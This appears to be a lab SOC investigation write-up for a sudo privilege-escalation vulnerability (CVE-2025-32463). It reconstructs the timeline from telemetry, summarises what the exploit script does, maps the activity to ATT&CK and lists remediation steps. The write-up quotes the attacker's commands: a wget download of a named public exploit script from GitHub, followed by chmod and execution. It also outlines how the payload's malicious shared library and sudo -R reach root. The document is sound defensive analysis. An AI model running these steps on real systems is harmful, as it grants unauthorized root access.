# SOC Investigation: CVE-2025-32463 Sudo Privilege Escalation

## Overview

This investigation analyzes a **successful local privilege-escalation attempt exploiting CVE-2025-32463**, a vulnerability affecting `sudo` chroot functionality. The activity began under the `devuser` account and progressed from host reconnaissance and exploit download to execution of a malicious proof-of-concept script. Process telemetry subsequently showed `/bin/bash` and follow-on discovery commands executing as **root**, providing strong evidence that privilege escalation succeeded.

> **Lab note:** This investigation was performed in a controlled security lab for defensive analysis and SOC practice.

---

## Alert Summary

| Field | Value |
|---|---|
| **CVE** | CVE-2025-32463 |
| **Alert Type** | Privilege Escalation |
| **Severity** | High |
| **Affected Host** | `ubuntu-dev` |
| **Source User** | `devuser` |
| **Escalated User** | `root` |
| **Primary Process** | `/usr/bin/bash` |
| **Primary Technique** | Exploitation for Privilege Escalation |
| **Investigation Verdict** | **True Positive – Successful Privilege Escalation** |

### Initial Alert

The SOC alert identified suspicious use of `sudo -R` associated with CVE-2025-32463. The alert provided the starting point for reviewing terminal history and process telemetry.

<p align="center">
  <img src="images/01-alert-overview.png" alt="SOC alert for CVE-2025-32463 privilege escalation" width="100%">
</p>

---

## Investigation Timeline

| Time | Activity | Analyst Interpretation |
|---|---|---|
| 19:55:20 | `whoami` | Identified the current user context. |
| 19:55:25 | `uname -a` | Collected operating-system/kernel information. |
| 19:55:35 | `sudo -V` | Checked the installed `sudo` version before exploitation. |
| 19:56:10 | `wget .../CVE-2025-32463_chwoot/.../sudo-chwoot.sh` | Downloaded the CVE proof-of-concept from GitHub. |
| 19:56:40 | `chmod +x /home/devuser/sudo-chwoot.sh` | Made the exploit script executable. |
| 19:57:10 | `/home/devuser/sudo-chwoot.sh` | Executed the exploit. |
| 19:58:23 | `mktemp -d /tmp/sudowoot.stage.XXXXXX` | Created a temporary staging directory used by the exploit. |
| 19:59:34 | `id` under a root-owned shell | Verified post-exploitation execution in a root context. |
| 19:59:37 | `uname -a` under root | Performed post-escalation system discovery. |
| 19:59:45 | `cat /etc/os-release` under root | Collected additional operating-system information after escalation. |

---

## Evidence Analysis

### 1. Reconnaissance and Exploit Download

Terminal history showed `devuser` checking the host and `sudo` version before retrieving a script explicitly named for **CVE-2025-32463** from GitHub using `wget`.

```bash
whoami
uname -a
sudo -V
wget https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/main/sudo-chwoot.sh -O /home/devuser/sudo-chwoot.sh
```

This sequence is consistent with an operator validating the target environment and then transferring a privilege-escalation tool to the host.

<p align="center">
  <img src="images/02-terminal-history-recon-download.png" alt="Terminal history showing reconnaissance and exploit download" width="100%">
</p>

---

### 2. Exploit Preparation and Execution

The downloaded script was granted execute permissions and then launched from the `devuser` home directory. Shortly afterward, the exploit created a temporary directory under `/tmp` for staging.

```bash
chmod +x /home/devuser/sudo-chwoot.sh
/home/devuser/sudo-chwoot.sh
mktemp -d /tmp/sudowoot.stage.XXXXXX
```

The tight timing between these events strongly links the staging directory to execution of the downloaded exploit.

<p align="center">
  <img src="images/03-exploit-execution-staging.png" alt="Exploit permission change, execution, and staging directory creation" width="70%">
</p>

---

### 3. Exploit Script Analysis

Review of `sudo-chwoot.sh` showed that the script:

- Creates a temporary staging directory.
- Builds a crafted chroot-style directory structure.
- Writes a malicious shared-library payload.
- Compiles the shared object with `gcc`.
- Uses `sudo -R` against the crafted environment.
- Calls `setreuid(0,0)` and `setregid(0,0)` inside the payload to obtain UID/GID 0.
- Launches `/bin/sh` with the supplied command, defaulting to `/bin/bash` when no command is provided.
- Removes the staging directory after execution.

The script contents align directly with the observed process behavior and the CVE-specific alert.

<p align="center">
  <img src="images/04-exploit-script-analysis.png" alt="Contents of sudo-chwoot.sh showing staging, shared library creation, sudo -R, and UID GID changes" width="100%">
</p>

---

### 4. Staging Activity Under `devuser`

Process telemetry recorded `mktemp -d /tmp/sudowoot.stage.XXXXXX` from a `bash` process running as `devuser`. This confirms that the exploit's staging behavior occurred in the original non-root user context.

<p align="center">
  <img src="images/05-devuser-staging-process.png" alt="Process telemetry showing mktemp staging command executed as devuser" width="100%">
</p>

---

### 5. Root-Level Command Execution

After exploit execution, process telemetry showed `/usr/bin/bash` running as **root** and executing commands including:

```bash
id
uname -a
cat /etc/os-release
```

The transition from `devuser`-owned exploit activity to root-owned shell execution is the strongest evidence that the local privilege escalation succeeded.

<p align="center">
  <img src="images/06-root-shell-confirmation.png" alt="Process telemetry showing bash and follow-on commands executing as root" width="100%">
</p>

---

## Attack Chain

```mermaid
flowchart TD
    A[devuser: whoami / uname -a] --> B[sudo -V]
    B --> C[wget sudo-chwoot.sh from GitHub]
    C --> D[chmod +x sudo-chwoot.sh]
    D --> E[Execute /home/devuser/sudo-chwoot.sh]
    E --> F[mktemp creates /tmp/sudowoot.stage.XXXXXX]
    F --> G[Craft chroot structure and malicious shared library]
    G --> H[sudo -R woot woot]
    H --> I[Payload calls setreuid 0,0 and setregid 0,0]
    I --> J[/bin/bash executes as root]
    J --> K[id / uname -a / cat /etc/os-release]
    K --> L[rm -rf removes staging artifacts]
```

---

## MITRE ATT&CK Mapping

| Technique | Name | Evidence |
|---|---|---|
| **T1068** | Exploitation for Privilege Escalation | CVE-2025-32463 exploit was executed to transition from `devuser` to root. |
| **T1105** | Ingress Tool Transfer | `wget` downloaded `sudo-chwoot.sh` from GitHub to the target host. |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | `bash`/shell processes were used to execute the exploit and follow-on commands. |
| **T1548.003** | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | The exploit abused `sudo -R` as part of the privilege-escalation path. |
| **T1033** | System Owner/User Discovery | `whoami` and `id` were used to identify or verify the active user context. |
| **T1082** | System Information Discovery | `uname -a` and `cat /etc/os-release` gathered host and operating-system information. |

> The script also deletes its temporary staging directory after execution. While this resembles **T1070.004 – File Deletion**, the observed cleanup alone is not enough to determine whether the intent was defense evasion or normal proof-of-concept cleanup.

---

## Key Findings

- The `devuser` account performed reconnaissance before exploitation.
- A CVE-specific privilege-escalation script was downloaded from GitHub.
- The script was made executable and launched from `/home/devuser/`.
- A temporary `/tmp/sudowoot.stage.*` directory was created as part of exploit execution.
- Script review confirmed creation of a malicious shared library and use of `sudo -R`.
- Process telemetry showed the activity beginning as `devuser` and later executing `/bin/bash` and discovery commands as `root`.
- The alert is therefore assessed as a **true positive with successful privilege escalation**.

---

## Recommended Response Actions

1. **Contain the affected host** if the activity is not authorized testing.
2. **Upgrade `sudo` to a vendor-patched release** that remediates CVE-2025-32463.
3. **Remove exploit artifacts** and inspect `/tmp`, the user's home directory, and related Docker overlay paths for residual files.
4. **Review authentication and SSH activity** to determine how `devuser` access was obtained.
5. **Hunt for additional root-level commands** executed after privilege escalation.
6. **Monitor for suspicious `sudo -R` usage**, temporary chroot structures, unusual shared-library compilation, and execution from `/tmp`.
7. **Rotate credentials or keys** associated with the affected account if unauthorized access is suspected.

---

## Investigation Conclusion

**Verdict: True Positive – Successful Privilege Escalation**

The investigation identified a complete privilege-escalation chain associated with **CVE-2025-32463**. `devuser` checked the target environment, downloaded and executed a CVE-specific exploit, and created the expected temporary staging environment. Static review of the script showed the malicious shared-library and `sudo -R` logic used to obtain UID/GID 0. Process telemetry then recorded `/bin/bash` and follow-on discovery commands executing as `root`. Taken together, the alert, terminal history, script contents, and process telemetry provide strong evidence that exploitation succeeded.

---

## Skills Demonstrated

- SOC alert triage and validation
- Linux process and terminal-history analysis
- Privilege-escalation investigation
- CVE exploit behavior analysis
- MITRE ATT&CK mapping
- Timeline reconstruction and evidence correlation
- Root-cause analysis and remediation planning

---

## Repository Structure

```text
CVE-2025-32463-SOC-Investigation/
├── README.md
└── images/
    ├── 01-alert-overview.png
    ├── 02-terminal-history-recon-download.png
    ├── 03-exploit-execution-staging.png
    ├── 04-exploit-script-analysis.png
    ├── 05-devuser-staging-process.png
    └── 06-root-shell-confirmation.png
```
